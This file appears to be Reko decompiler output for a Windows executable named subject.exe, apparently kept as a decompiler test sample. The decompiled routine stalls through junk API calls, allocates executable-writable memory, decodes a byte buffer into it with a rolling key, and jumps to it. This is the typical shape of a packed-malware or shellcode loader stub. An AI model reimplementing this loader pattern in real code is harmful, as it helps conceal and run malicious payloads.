// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004125BE: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	return DPB(eax, fn004125C7(), 8);
}

// 004125C7: Register byte fn004125C7()
byte fn004125C7()
{
	ptr32 esp_1 = fp;
	int32 esi_2 = 0x00;
	do
	{
		LPFILETIME * esp_7 = esp_1 - 0x04;
		*esp_7 = (LPFILETIME *) (struct _FILETIME *) 0x08;
		*(esp_7 - 0x04) = 0x17;
		*(esp_7 - 0x08) = 0x07;
		*(esp_7 - 0x0C) = 0x09;
		*(esp_7 - 0x10) = 0x00;
		Eq_13 eax_17 = GetProcessTimes(*(esp_7 - 0x10), *(esp_7 - 0x0C), *(esp_7 - 0x08), *(esp_7 - 0x04), *esp_7);
		ui32 edx_20 = (eax_17 | 0xFF) & 0xEC;
		*(esp_7 - 0x14) = edx_20;
		*(esp_7 - 0x18) = 0x15;
		*(esp_7 - 0x1C) = 0x00522B33;
		*(esp_7 - 0x20) = 0x00FFF7FC;
		*(esp_7 - 0x24) = 0x07;
		*(esp_7 - 0x28) = 8771135;
		*(esp_7 - 44) = 0x00;
		Eq_48 eax_37 = MapViewOfFileEx(*(esp_7 - 44), *(esp_7 - 0x28), *(esp_7 - 0x24), *(esp_7 - 0x20), *(esp_7 - 0x1C), *(esp_7 - 0x18));
		esi_2 = esi_2 + edx_20;
		byte bl_40 = (byte) *(esp_7 - 44);
		esp_1 = esp_7 - 0x28;
	} while (esi_2 < 138331879 && eax_37 == 0x00);
	*(esp_7 - 44) = (eax_17 | 0xFF) & 0xEC;
	*(esp_7 - 0x30) = 0x40;
	*(esp_7 - 0x34) = 0x3000;
	*(esp_7 - 0x38) = 0x00015393;
	*(esp_7 - 0x3C) = 0x00;
	Eq_48 eax_59 = VirtualAlloc(*(esp_7 - 0x3C), *(esp_7 - 0x38), *(esp_7 - 0x34), *(esp_7 - 0x30));
	byte * esi_64 = *(esp_7 - 0x38) + 0x0107;
	*(esp_7 - 0x3C) = (union Eq_48 *) eax_59;
	Eq_48 edi_63 = eax_59;
	ptr32 esp_112 = esp_7 - 0x3C;
	word32 ecx_127 = 0x01E2;
	uint32 edx_115 = 1219797558;
	byte dl_116 = 0x36;
	word32 ebp_118 = 0x00;
	do
	{
		byte bh_84 = dl_116 + *esi_64;
		*edi_63 = bh_84;
		*edi_63 = (word32) *edi_63 + bl_40;
		uint32 * esp_92 = esp_112 - 0x04;
		*esp_92 = edx_115;
		*(esp_92 - 0x04) = ecx_127;
		*(esp_92 - 0x08) = 0x09;
		*(esp_92 - 0x0C) = 0x1B;
		*(esp_92 - 0x10) = 0x13;
		*(esp_92 - 0x14) = 0x1D;
		*(esp_92 - 0x18) = 0x17;
		*(esp_92 - 0x1C) = 0x00;
		Eq_48 eax_108 = MapViewOfFileEx(*(esp_92 - 0x1C), *(esp_92 - 0x18), *(esp_92 - 0x14), *(esp_92 - 0x10), *(esp_92 - 0x0C), *(esp_92 - 0x08));
		uint32 edx_111 = *(esp_92 - 0x18);
		word32 ebp_117 = ebp_118 + 0x0009058B;
		esi_64 = esi_64 + 0x01;
		edi_63 = edi_63 + 0x01;
		word32 ecx_109 = *(esp_92 - 0x1C);
		esp_112 = esp_92 - 0x14;
		edx_115 = edx_111 >> 0x08;
		dl_116 = (byte) (edx_111 >> 0x08);
		ebp_118 = ebp_117 - 0x0009058A;
		if (ebp_117 - 0x0009058A == eax_108 + 0x04)
		{
			edx_115 = 1219797558;
			dl_116 = 0x36;
			ebp_118 = 0x00;
		}
		ecx_127 = ecx_109 - 0x01;
	} while (ecx_109 != 0x01);
	ptr32 eax_130 = *(esp_92 - 0x14);
	word32 esp_136;
	word32 esi_137;
	word32 eax_138;
	word32 edx_139;
	byte SZO_140;
	byte C_141;
	byte SCZO_142;
	word32 ebx_143;
	byte SO_144;
	byte Z_145;
	word32 ecx_146;
	word32 edi_147;
	word32 ebp_148;
	byte bh_149;
	byte dl_150;
	byte bl_151;
	byte ah_152;
	(eax_130 + 0x04)();
	return ah_152;
}

